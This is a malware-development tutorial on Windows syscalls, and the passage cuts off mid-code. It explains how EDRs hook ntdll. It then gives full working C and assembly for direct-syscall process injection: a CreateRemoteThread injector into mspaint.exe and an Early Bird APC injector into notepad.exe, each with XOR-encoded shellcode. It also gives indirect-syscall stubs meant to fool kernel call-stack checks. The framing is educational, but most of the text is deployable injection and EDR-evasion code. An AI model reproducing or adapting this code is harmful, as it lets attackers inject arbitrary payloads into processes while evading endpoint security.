---
tags:
  - MalwareDevelopment
---
# Syscalls

![](/img/demistiying_syscall_cover.png)

A system call or syscall is the mechanism a user-mode program uses to ask the kernel to do something it cannot do in its own. Modern CPU enforce a strict privilege boundary, programs runs in ring 3 (usermode), where it can move its own memory around but allocating memory pages, opening files, creating threads, sending packets requires to be in ring 0. 

The CPU will not let user code simply jump into the kernel, only legitimate way across that boundary is the `syscall` instruction. It is a two-byte opcode `0F 05` that traps kernel at well defined entry point.

When we call something innocent-looking like `VirtualAlloc` from code, lot more happens under than we think. The call is traversed several layers before it reaches the kernel.

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 720" width="100%" style="background:#1a1a1a; font-family: 'Consolas', 'Monaco', monospace;">
  <defs>
    <marker id="arrowhead" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
      <path d="M2 1 L8 5 L2 9" fill="none" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
    </marker>
  </defs>

  <!-- User mode label -->
  <text x="30" y="40" fill="#888888" font-size="12" font-style="italic">USER MODE</text>
  <line x1="30" y1="50" x2="670" y2="50" stroke="#444444" stroke-width="0.5" stroke-dasharray="4 4"/>

  <!-- Your code -->
  <rect x="250" y="70" width="200" height="50" rx="6" fill="#2d3e50" stroke="#5dade2" stroke-width="1"/>
  <text x="350" y="100" fill="#ffffff" font-size="14" text-anchor="middle" font-weight="500">Your code</text>

  <line x1="350" y1="125" x2="350" y2="155" stroke="#ffffff" stroke-width="1.5" marker-end="url(#arrowhead)"/>

  <!-- kernel32.dll -->
  <rect x="180" y="160" width="340" height="60" rx="6" fill="#2d3e50" stroke="#5dade2" stroke-width="1"/>
  <text x="350" y="185" fill="#ffffff" font-size="14" text-anchor="middle" font-weight="500">kernel32.dll</text>
  <text x="350" y="205" fill="#aaaaaa" font-size="12" text-anchor="middle">VirtualAlloc</text>

  <line x1="350" y1="225" x2="350" y2="255" stroke="#ffffff" stroke-width="1.5" marker-end="url(#arrowhead)"/>

  <!-- kernelbase.dll -->
  <rect x="150" y="260" width="400" height="70" rx="6" fill="#2d3e50" stroke="#5dade2" stroke-width="1"/>
  <text x="350" y="285" fill="#ffffff" font-size="14" text-anchor="middle" font-weight="500">kernelbase.dll</text>
  <text x="350" y="305" fill="#aaaaaa" font-size="12" text-anchor="middle">VirtualAlloc</text>
  <text x="350" y="320" fill="#888888" font-size="11" text-anchor="middle" font-style="italic">(real implementation lives here)</text>

  <line x1="350" y1="335" x2="350" y2="365" stroke="#ffffff" stroke-width="1.5" marker-end="url(#arrowhead)"/>

  <!-- ntdll.dll - highlighted -->
  <rect x="130" y="370" width="440" height="80" rx="6" fill="#3d2d50" stroke="#bb6bd9" stroke-width="1.5"/>
  <text x="350" y="395" fill="#ffffff" font-size="14" text-anchor="middle" font-weight="500">ntdll.dll</text>
  <text x="350" y="415" fill="#dddddd" font-size="12" text-anchor="middle">NtAllocateVirtualMemory</text>
  <text x="350" y="432" fill="#bb6bd9" font-size="11" text-anchor="middle" font-style="italic">syscall stub lives here</text>

  <line x1="350" y1="455" x2="350" y2="495" stroke="#ffffff" stroke-width="1.5" marker-end="url(#arrowhead)"/>
  <text x="370" y="478" fill="#f39c12" font-size="11" font-style="italic">syscall instruction (0F 05)</text>

  <!-- Boundary line -->
  <line x1="30" y1="510" x2="670" y2="510" stroke="#f39c12" stroke-width="1.5" stroke-dasharray="6 4"/>
  <text x="40" y="530" fill="#f39c12" font-size="11" font-style="italic">─ ─ ─ user / kernel boundary ─ ─ ─</text>

  <!-- Kernel mode label -->
  <text x="30" y="555" fill="#888888" font-size="12" font-style="italic">KERNEL MODE</text>

  <!-- Kernel -->
  <rect x="160" y="575" width="380" height="80" rx="6" fill="#502d2d" stroke="#e74c3c" stroke-width="1"/>
  <text x="350" y="605" fill="#ffffff" font-size="14" text-anchor="middle" font-weight="500">Kernel</text>
  <text x="350" y="630" fill="#dddddd" font-size="12" text-anchor="middle">nt!NtAllocateVirtualMemory</text>

  <!-- Footer note -->
  <text x="350" y="695" fill="#666666" font-size="10" text-anchor="middle" font-style="italic">The syscall instruction is the only legitimate way to cross from user mode to kernel mode.</text>
</svg>

So when using `VirtualAlloc` we are talking to `kernel32.dll`, which forwards to `kernelbase.dll` which finally calls into `ntdll.dll`. It's inside ntdll that the real syscall happens. Every `Nt*` function in ntdll (`NtAllocateVirtualMemory`, `NtCreateFile`, `NtOpenProcess`, and so on) is a tiny assembly stub that does three things: it shuffles arguments into the registers the kernel expects, loads a number called the System Service Number (SSN) into `eax` to tell the kernel which service is being requested, and then executes the `syscall` instruction:

```asm
NtAllocateVirtualMemory:
    mov     r10, rcx        ; move first argument into r10 (syscall clobbers rcx)
    mov     eax, 18h        ; load the SSN for this function
    syscall                 ; trap into the kernel
    ret                     ; return to caller
```

This is how control transfers to the kernel. To test we can open `notepad.exe` in x64dbg and then press `ALT+F9` to run to user code and then go to `Symbols` and follow it in disassembler:

![](/img/lesg.png)

Press `Ctrl+G` to open "Go to expression dialog" and type `ntdll.NtAllocateVirtualMemory` and hit enter.

![](/img/syscall.png)

The first instruction is `mov r10, rcx` bytes: `4C 8B D1`. The SSN is in `mov eax, XX` where XX in my case is `18`. The `syscall` instruction as we said is exactly two bytes `0F 05` at offset `+0x12` from the function start (note this). (count: 3 + 5 + 8 + 2 = 18 = 0x12)

Now if we check with any other syscall like `ntdll.NtProtectVirtualMemory`:

![](/img/syscall-direct.png)

Prologue and everything are same only different is the SSN `mov eax, 50` instead of `18`.  These SSN can differ depending on different version and builds of Windows, to find SSN we can use [j00ru](https://j00ru.vexillium.org/syscalls/nt/64/) site. Mostly EDRs always hook this `ntdll` part to monitor by why `¯\_(ツ)_/¯ `
## Why does EDR hook `ntdll`?

EDRs need visibility into what programs are doing. They specially care about API calls that malware abuses i.e memory allocation, process creation etc... Since `ntdll` is the last user mode layer before the kernel, it's ideal chokepoint (no pun intended). The EDR overwrites the first few bytes of the function with a `jmp` to its own inspection routine:

```bash
Original stub:                          Hooked stub:
4C 8B D1   mov r10, rcx                 E9 XX XX XX XX   jmp <edr_inspector>
B8 18 00 00 00   mov eax, 18h           90 90 90         ; junk leftover
F6 04 25 ...   test ...                 ...
75 03   jne ...
0F 05   syscall
C3   ret
```

When the EDR's inspection routine finishes, it usually calls a saved copy of the original prologue and jumps back into the function just past the hook, so the function still works, but the EDR got a look at the arguments first. It can log the call, block it, or kill the process.

This is called **inline hooking** (or **patching**), and it's the most common userland telemetry technique. 
# Direct Syscalls

The clever observation is that we don't actually need ntdll to execute a syscall. The `syscall` instruction is just a CPU instruction so we can put our own code. If we build our own version of  `NtAllocateVirtualMemory` in assembly, one that does exactly what ntdll's stub does we never touch the hooked function. We have already done it above:

```asm
SysNtAllocateVirtualMemory PROC
    mov     r10, rcx
    mov     eax, 18h         ; SSN for NtAllocateVirtualMemory
    syscall
    ret
SysNtAllocateVirtualMemory ENDP
```

There it is the four instructions. We call it from C like how we'd call other functions.

```c
extern "C" NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);
```

Here is what a complete direct syscall self allocation would look like (it's noisy and not OPSEC safe in any real engagement but it's cleanest illustration of technique):

`syscalls.S`: (GAS Intel syntax)

```c
.intel_syntax noprefix
.global SysNtAllocateVirtualMemory

.text

SysNtAllocateVirtualMemory:
    mov     r10, rcx        # move first arg into r10 (syscall clobbers rcx)
    mov     eax, 0x18       # SSN for NtAllocateVirtualMemory 
    syscall                 # trap into kernel
    ret
```

`main.c`:

```c
#include <windows.h>
#include <stdio.h>

typedef LONG NTSTATUS;

extern NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

int main(void) {
    PVOID  buffer = NULL;
    SIZE_T size   = 0x1000;

    printf("[*] Calling SysNtAllocateVirtualMemory directly...\n");

    NTSTATUS status = SysNtAllocateVirtualMemory(
        (HANDLE)-1,                     // current process pseudo-handle
        &buffer,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status == 0) {
        printf("[+] Allocated %zu bytes at %p\n", size, buffer);
    } else {
        printf("[-] Syscall failed: 0x%lX\n", status);
    }
    return 0;
}
```

```bash
x86_64-w64-mingw32-gcc syscalls.S main.c -o direct_syscall.exe
```

Let's implement `CreateRemoteThread` shellcode and Early bird injection shellcode with multi byte XOR using Direct Syscalls. For it we need to get specific SSN, I will use x64dbg like how we got SSN before for each of the APIs needed:

```
NtAllocateVirtualMemory  = 0x18
NtWriteVirtualMemory     = 0x3A
NtQueueApcThread         = 0x45
NtResumeThread           = 0x52
```

`syscalls.S`:

```c
.intel_syntax noprefix

.global SysNtAllocateVirtualMemory
.global SysNtWriteVirtualMemory
.global SysNtProtectVirtualMemory
.global SysNtQueueApcThread
.global SysNtResumeThread

.text

SysNtAllocateVirtualMemory:
    mov     r10, rcx
    mov     eax, 0x18
    syscall
    ret

SysNtWriteVirtualMemory:
    mov     r10, rcx
    mov     eax, 0x3A
    syscall
    ret

SysNtProtectVirtualMemory:
    mov     r10, rcx
    mov     eax, 0x50
    syscall
    ret

SysNtQueueApcThread:
    mov     r10, rcx
    mov     eax, 0x45
    syscall
    ret

SysNtResumeThread:
    mov     r10, rcx
    mov     eax, 0x52
    syscall
    ret
```

`CreateRemoteThread.c`:

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

extern NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

extern NTSTATUS SysNtWriteVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

extern NTSTATUS SysNtProtectVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);

/*
 * XOR-encoded with key {0xDE, 0xAD, 0xBE, 0xEF} — rolling 4-byte key.
*/
static unsigned char sc_enc[] = {
    0x22,0xe5,0x3d,0x0b,0x2e,0x45,0x7e,0xef,0xde,0xad,0xff,0xbe,0x9f,0xfd,
    0xec,0xbe,0x88,0xe5,0x8f,0x3d,0xbb,0xe5,0x35,0xbd,0xbe,0xe5,0x35,0xbd,
    0xc6,0xe5,0x35,0xbd,0xfe,0xe5,0x35,0x9d,0x8e,0xe5,0xb1,0x58,0x94,0xe7,
    0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0x91,0xdf,0x93,0xdc,0x81,0x9e,0xae,
    0x1f,0x64,0xb3,0xae,0xdf,0x6c,0x5c,0x02,0x8c,0xec,0xef,0xa7,0x55,0xff,
    0x9e,0x64,0x9c,0x91,0xf6,0xee,0x0e,0x26,0x3e,0x67,0xde,0xad,0xbe,0xa7,
    0x5b,0x6d,0xca,0x88,0x96,0xac,0x6e,0xbf,0x55,0xe5,0xa6,0xab,0x55,0xed,
    0x9e,0xa6,0xdf,0x7d,0x5d,0xb9,0x96,0x52,0x77,0xae,0x55,0x99,0x36,0xa7,
    0xdf,0x7b,0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0xec,0x7f,0x26,0xd3,0xec,
    0xbf,0x2e,0xe6,0x4d,0xcb,0x1e,0x92,0xae,0xf2,0xcb,0xd6,0xe8,0x87,0x3e,
    0xab,0x75,0xe6,0xab,0x55,0xed,0x9a,0xa6,0xdf,0x7d,0xd8,0xae,0x55,0xa1,
    0xf6,0xab,0x55,0xed,0xa2,0xa6,0xdf,0x7d,0xff,0x64,0xda,0x25,0xf6,0xee,
    0x0e,0xec,0xe6,0xae,0x86,0xf3,0xe7,0xb5,0x9f,0xf5,0xff,0xb6,0x9f,0xf7,
    0xf6,0x6c,0x32,0x8d,0xff,0xbd,0x21,0x4d,0xe6,0xae,0x87,0xf7,0xf6,0x64,
    0xcc,0x44,0xe9,0x10,0x21,0x52,0xe3,0xa7,0x64,0xac,0xbe,0xef,0xde,0xad,
    0xbe,0xef,0xde,0xe5,0x33,0x62,0xdf,0xac,0xbe,0xef,0x9f,0x17,0x8f,0x64,
    0xb1,0x2a,0x41,0x3a,0x65,0x5d,0x0b,0x4d,0x88,0xec,0x04,0x49,0x4b,0x10,
    0x23,0x10,0x0b,0xe5,0x3d,0x2b,0xf6,0x91,0xb8,0x93,0xd4,0x2d,0x45,0x0f,
    0xab,0xa8,0x05,0xa8,0xcd,0xdf,0xd1,0x85,0xde,0xf4,0xff,0x66,0x04,0x52,
    0x6b,0x8c,0xbf,0xc1,0xdd,0xc1,0xbb,0xd5,0xdb,0xef,
};

static const unsigned char xor_key[] = {0xDE, 0xAD, 0xBE, 0xEF};

static void xor_decode(unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= xor_key[i % sizeof(xor_key)];
}

static DWORD pid_by_name(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

int main(void) {
    DWORD pid = pid_by_name("mspaint.exe");
    if (!pid) { printf("[-] mspaint.exe not found\n"); return 1; }
    printf("[*] Target PID: %lu\n", pid);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { printf("[-] OpenProcess: %lu\n", GetLastError()); return 1; }

    /* decode into a local heap copy so the encoded array stays untouched */
    unsigned char *decoded = (unsigned char *)malloc(sizeof(sc_enc));
    memcpy(decoded, sc_enc, sizeof(sc_enc));
    xor_decode(decoded, sizeof(sc_enc));

    PVOID  buf  = NULL;
    SIZE_T size = sizeof(sc_enc);

    NTSTATUS st = SysNtAllocateVirtualMemory(
        hProc, &buf, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE   // RW only — no execute bit yet
    );
    if (!NT_SUCCESS(st)) { printf("[-] NtAllocateVirtualMemory: 0x%lX\n", st); return 1; }
    printf("[+] Remote buffer: %p (%zu bytes)\n", buf, size);

    SIZE_T written = 0;
    st = SysNtWriteVirtualMemory(hProc, buf, decoded, sizeof(sc_enc), &written);
    free(decoded);
    if (!NT_SUCCESS(st)) { printf("[-] NtWriteVirtualMemory: 0x%lX\n", st); return 1; }
    printf("[+] Wrote %zu bytes\n", written);

    // flip RW -> RX
    ULONG old_protect = 0;
    SIZE_T protect_size = sizeof(sc_enc);
    st = SysNtProtectVirtualMemory(hProc, &buf, &protect_size, PAGE_EXECUTE_READ, &old_protect);
    if (!NT_SUCCESS(st)) { printf("[-] NtProtectVirtualMemory: 0x%lX\n", st); return 1; }
    printf("[+] Protection: RW -> RX (was 0x%lX)\n", old_protect);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
    if (!hThread) { printf("[-] CreateRemoteThread: %lu\n", GetLastError()); return 1; }
    printf("[+] Thread: %p\n", hThread);

    WaitForSingleObject(hThread, 4000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

`EarlyBird.c`:

```c
#include <windows.h>
#include <stdio.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

extern NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

extern NTSTATUS SysNtWriteVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

extern NTSTATUS SysNtQueueApcThread(
    HANDLE ThreadHandle,
    PVOID  ApcRoutine,
    PVOID  ApcArgument1,
    PVOID  ApcArgument2,
    PVOID  ApcArgument3
);

extern NTSTATUS SysNtProtectVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);

extern NTSTATUS SysNtResumeThread(
    HANDLE  ThreadHandle,
    PULONG  PreviousSuspendCount
);

/*
 * calc.exe shellcode (windows/x64/exec CMD=calc.exe, 276 bytes)
 * XOR-encoded with key {0xDE, 0xAD, 0xBE, 0xEF} — rolling 4-byte key.
 */
static unsigned char sc_enc[] = {
    0x22,0xe5,0x3d,0x0b,0x2e,0x45,0x7e,0xef,0xde,0xad,0xff,0xbe,0x9f,0xfd,
    0xec,0xbe,0x88,0xe5,0x8f,0x3d,0xbb,0xe5,0x35,0xbd,0xbe,0xe5,0x35,0xbd,
    0xc6,0xe5,0x35,0xbd,0xfe,0xe5,0x35,0x9d,0x8e,0xe5,0xb1,0x58,0x94,0xe7,
    0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0x91,0xdf,0x93,0xdc,0x81,0x9e,0xae,
    0x1f,0x64,0xb3,0xae,0xdf,0x6c,0x5c,0x02,0x8c,0xec,0xef,0xa7,0x55,0xff,
    0x9e,0x64,0x9c,0x91,0xf6,0xee,0x0e,0x26,0x3e,0x67,0xde,0xad,0xbe,0xa7,
    0x5b,0x6d,0xca,0x88,0x96,0xac,0x6e,0xbf,0x55,0xe5,0xa6,0xab,0x55,0xed,
    0x9e,0xa6,0xdf,0x7d,0x5d,0xb9,0x96,0x52,0x77,0xae,0x55,0x99,0x36,0xa7,
    0xdf,0x7b,0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0xec,0x7f,0x26,0xd3,0xec,
    0xbf,0x2e,0xe6,0x4d,0xcb,0x1e,0x92,0xae,0xf2,0xcb,0xd6,0xe8,0x87,0x3e,
    0xab,0x75,0xe6,0xab,0x55,0xed,0x9a,0xa6,0xdf,0x7d,0xd8,0xae,0x55,0xa1,
    0xf6,0xab,0x55,0xed,0xa2,0xa6,0xdf,0x7d,0xff,0x64,0xda,0x25,0xf6,0xee,
    0x0e,0xec,0xe6,0xae,0x86,0xf3,0xe7,0xb5,0x9f,0xf5,0xff,0xb6,0x9f,0xf7,
    0xf6,0x6c,0x32,0x8d,0xff,0xbd,0x21,0x4d,0xe6,0xae,0x87,0xf7,0xf6,0x64,
    0xcc,0x44,0xe9,0x10,0x21,0x52,0xe3,0xa7,0x64,0xac,0xbe,0xef,0xde,0xad,
    0xbe,0xef,0xde,0xe5,0x33,0x62,0xdf,0xac,0xbe,0xef,0x9f,0x17,0x8f,0x64,
    0xb1,0x2a,0x41,0x3a,0x65,0x5d,0x0b,0x4d,0x88,0xec,0x04,0x49,0x4b,0x10,
    0x23,0x10,0x0b,0xe5,0x3d,0x2b,0xf6,0x91,0xb8,0x93,0xd4,0x2d,0x45,0x0f,
    0xab,0xa8,0x05,0xa8,0xcd,0xdf,0xd1,0x85,0xde,0xf4,0xff,0x66,0x04,0x52,
    0x6b,0x8c,0xbf,0xc1,0xdd,0xc1,0xbb,0xd5,0xdb,0xef,
};

static const unsigned char xor_key[] = {0xDE, 0xAD, 0xBE, 0xEF};

static void xor_decode(unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= xor_key[i % sizeof(xor_key)];
}

int main(void) {
    STARTUPINFOA        si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED,
            NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] PID %lu TID %lu (suspended)\n", pi.dwProcessId, pi.dwThreadId);

    unsigned char *decoded = (unsigned char *)malloc(sizeof(sc_enc));
    memcpy(decoded, sc_enc, sizeof(sc_enc));
    xor_decode(decoded, sizeof(sc_enc));

    PVOID  buf  = NULL;
    SIZE_T size = sizeof(sc_enc);

    NTSTATUS st = SysNtAllocateVirtualMemory(
        pi.hProcess, &buf, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE   // RW only — no execute bit yet
    );
    if (!NT_SUCCESS(st)) { printf("[-] NtAllocateVirtualMemory: 0x%lX\n", st); goto fail; }
    printf("[+] Remote buffer: %p\n", buf);

    SIZE_T written = 0;
    st = SysNtWriteVirtualMemory(pi.hProcess, buf, decoded, sizeof(sc_enc), &written);
    free(decoded);
    if (!NT_SUCCESS(st)) { printf("[-] NtWriteVirtualMemory: 0x%lX\n", st); goto fail; }
    printf("[+] Wrote %zu bytes\n", written);

    // flip RW -> RX before queuing the APC
    ULONG old_protect = 0;
    SIZE_T protect_size = sizeof(sc_enc);
    st = SysNtProtectVirtualMemory(pi.hProcess, &buf, &protect_size, PAGE_EXECUTE_READ, &old_protect);
    if (!NT_SUCCESS(st)) { printf("[-] NtProtectVirtualMemory: 0x%lX\n", st); goto fail; }
    printf("[+] Protection: RW -> RX (was 0x%lX)\n", old_protect);

    /*
     * Queue APC to the suspended main thread.
     * When the thread resumes it enters an alertable wait before running any
     * user code, so the APC fires first — shellcode runs before the entry point.
     */
    st = SysNtQueueApcThread(pi.hThread, buf, NULL, NULL, NULL);
    if (!NT_SUCCESS(st)) { printf("[-] NtQueueApcThread: 0x%lX\n", st); goto fail; }
    printf("[+] APC queued at %p\n", buf);

    ULONG prev = 0;
    st = SysNtResumeThread(pi.hThread, &prev);
    if (!NT_SUCCESS(st)) { printf("[-] NtResumeThread: 0x%lX\n", st); goto fail; }
    printf("[+] Resumed (prev suspend count: %lu)\n", prev);

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;

fail:
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}
```
# Indirect Syscalls

Most EDRs caught up to this technique years ago, and one of most red team operators actually use today is called **indirect syscalls**. The idea is that we keep our own assembly stub that sets up registers like ntdll would, but instead of executing `syscall` ourselves, we jump to the `syscall` instruction that lives inside ntdll. In previous method we bypassed ntdll's hooked `NtAllocateVirtualMemory` completely. The EDR's `jmp` overwrite at the start of that function never ran, because we never called it. So what's wrong with this picture ?
## Call stack problem

The kernel doesn't just blindly trust whoever invokes a syscall. On modern windows, kernel-side telementry (and an increasing number of EDRs that hook into kernel callbacks) inspects the call stack at the moment of the syscall to see where it came from. In a normal program, every syscall originates from inside `ntdll.dll`. Always. There is no legitimate userland code path that issues a syscall from anywhere else. 

We can see how the call stack (mechanism used to keep track of function calls) looks like in moment of `syscall` instruction in Direct Syscall program. I will use that Early Bird above program.  **Ctrl+F** (search in current module) ->  Command -> type `syscall` and set break point in first one:

![](/img/syscall-indirect.png)

Run `F9` until breakpoint at `syscall` comes and then see call stack tab:

![](/img/syscall-dynamic.png)

Look at the **Main Thread** (5828) call stack:

```c
earlybird.00007FF728C21458   ← our stub (no ntdll above it)
earlybird.00007FF728C2168A
earlybird.00007FF728C210C9
earlybird.00007FF728C21416
kernel32.BaseThreadInitThunk+14
ntdll.RtlUserThreadStart+21
```

**No ntdll frame at the top.** It jumps straight from our binary into the kernel. Compare that to the other threads (9740, 13032) which show:

```c
ntdll.NtWaitForWorkViaWorkerFactory+14  ← ntdll on top, legitimate
ntdll.TpReleaseCleanupGroupMembers+747
kernel32.BaseThreadInitThunk+14
```

Those threads have ntdll sitting at the top, exactly where a legitimate syscall should originate from. This is an enormous red flag. Modern EDRs that do kernel-side stack walking flag this immediately. So this is where we do our **indirect syscalls** trick.

The syscall instruction is just two bytes `0F 05`. CPU doesn't care where those two bytes live. They could be our binary, ntdll, in kernel32, in JIT compiled buffer, anywhere with executable permission. The kernel only knows about the syscall event itself; it doesn't know where the bytes were located in user memory. So here's what we do: instead of putting `0F 05` in our own code, we jump to the `0F 05` that already exists inside ntdll, after we've finished setting up the registers ourselves.

The flow becomes:

1. Our C code calls `SysNtAllocateVirtualMemory`
2. Our ASM stub sets up registers (`mov r10, rcx`, `mov eax, SSN`) then `jmp` into ntdll
3. Execution lands at `NtAllocateVirtualMemory+0x12` inside ntdll the `syscall` instruction fires from there
4. Kernel sees return address pointing into ntdll looks completely legitimate
5. `ret` inside ntdll sends us straight back to our caller

<svg width="100%" viewBox="0 0 680 620" role="img">
<title>Indirect syscall flow</title>
<defs>
<marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
<path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
</marker>
</defs>

<!-- Step 1 - C code -->
<rect x="160" y="30" width="360" height="56" rx="8" fill="#2C2C2A" stroke="#5F5E5A" stroke-width="0.5"/>
<text font-family="monospace" font-size="13" font-weight="500" fill="white" x="340" y="52" text-anchor="middle" dominant-baseline="central">1 — C code</text>
<text font-family="monospace" font-size="11" fill="#B4B2A9" x="340" y="71" text-anchor="middle" dominant-baseline="central">calls SysNtAllocateVirtualMemory()</text>

<line x1="340" y1="86" x2="340" y2="122" stroke="#888780" stroke-width="1.5" marker-end="url(#arrow)"/>

<!-- Step 2 - ASM stub -->
<rect x="80" y="124" width="520" height="86" rx="8" fill="#3C3489" stroke="#534AB7" stroke-width="0.5"/>
<text font-family="monospace" font-size="13" font-weight="500" fill="white" x="340" y="148" text-anchor="middle" dominant-baseline="central">2 — ASM stub</text>
<text font-family="monospace" font-size="11" fill="#CECBF6" x="200" y="170" dominant-baseline="central">mov  r10, rcx</text>
<text font-family="monospace" font-size="11" fill="#CECBF6" x="200" y="188" dominant-baseline="central">mov  eax, 0x18         ; SSN</text>
<text font-family="monospace" font-size="11" fill="#CECBF6" x="200" y="199" dominant-baseline="central">jmp  [g_syscallAddr]   ; no ret — we borrow ntdll's</text>

<line x1="340" y1="210" x2="340" y2="246" stroke="#888780" stroke-width="1.5" marker-end="url(#arrow)"/>

<!-- Step 3 - ntdll -->
<rect x="80" y="248" width="520" height="76" rx="8" fill="#085041" stroke="#0F6E56" stroke-width="0.5"/>
<text font-family="monospace" font-size="13" font-weight="500" fill="white" x="340" y="272" text-anchor="middle" dominant-baseline="central">3 — ntdll!NtAllocateVirtualMemory+0x12</text>
<text font-family="monospace" font-size="11" fill="#9FE1CB" x="200" y="296" dominant-baseline="central">syscall   ; fires here — hook at +0x00 never touched</text>
<text font-family="monospace" font-size="11" fill="#9FE1CB" x="200" y="314" dominant-baseline="central">ret       ; returns to C caller</text>

<line x1="340" y1="324" x2="340" y2="360" stroke="#888780" stroke-width="1.5" marker-end="url(#arrow)"/>

<!-- Step 4 - kernel -->
<rect x="160" y="362" width="360" height="56" rx="8" fill="#2C2C2A" stroke="#5F5E5A" stroke-width="0.5"/>
<text font-family="monospace" font-size="13" font-weight="500" fill="white" x="340" y="384" text-anchor="middle" dominant-baseline="central">4 — kernel</text>
<text font-family="monospace" font-size="11" fill="#B4B2A9" x="340" y="403" text-anchor="middle" dominant-baseline="central">return addr = ntdll — looks legitimate</text>

<!-- ret back arrow -->
<path d="M600 390 Q648 390 648 58 Q648 58 522 58" fill="none" stroke="#534AB7" stroke-width="1" stroke-dasharray="4 3" marker-end="url(#arrow)"/>
<text font-family="monospace" font-size="10" fill="#7F77DD" x="655" y="228" text-anchor="middle" dominant-baseline="central" transform="rotate(90,655,228)">ret back to caller</text>

</svg>
The `0x12` is the offset that I mentioned in starting is from instruction count offset `3 + 5 + 8 + 2 = 18 = 0x12`. So if `GetProcAddress(ntdll, "NtAllocateVirtualMemory")` gives us address `X`, then `X + 0x12` is the `syscall` instruction. So there are basically two changes from Direct Syscall:

1. Instead of executing `syscall` ourselves, we `jmp` to ntdll's `syscall` instruction
2. That target address must be resolved at runtime, we store it in a global that C populates before calling the stub

The C code:

```c
ULONG_PTR pNtAlloc = (ULONG_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
g_syscallAddr = pNtAlloc + 0x12;
```

The ASM stub:

```asm
SysNtAllocateVirtualMemory:
    mov   r10, rcx
    mov   eax, 0x18
    jmp   qword ptr [rip + g_syscallAddr]
```

`syscalls.S`:

```asm
.intel_syntax noprefix
.global SysNtAllocateVirtualMemory

.data
.global g_syscallAddr
g_syscallAddr:
    .quad 0

.text

SysNtAllocateVirtualMemory:
    mov     r10, rcx                                    # move first arg into r10 (syscall clobbers rcx)
    mov     eax, 0x18                                   # SSN for NtAllocateVirtualMemory
    jmp     qword ptr [rip + g_syscallAddr]             # jump to ntdll's syscall instruction, no ret needed
```

`main.c`:

```c
#include <windows.h>
#include <stdio.h>

typedef LONG NTSTATUS;

extern ULONG_PTR g_syscallAddr;

extern NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

int main(void) {
    // resolve ntdll's syscall gadget at runtime
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
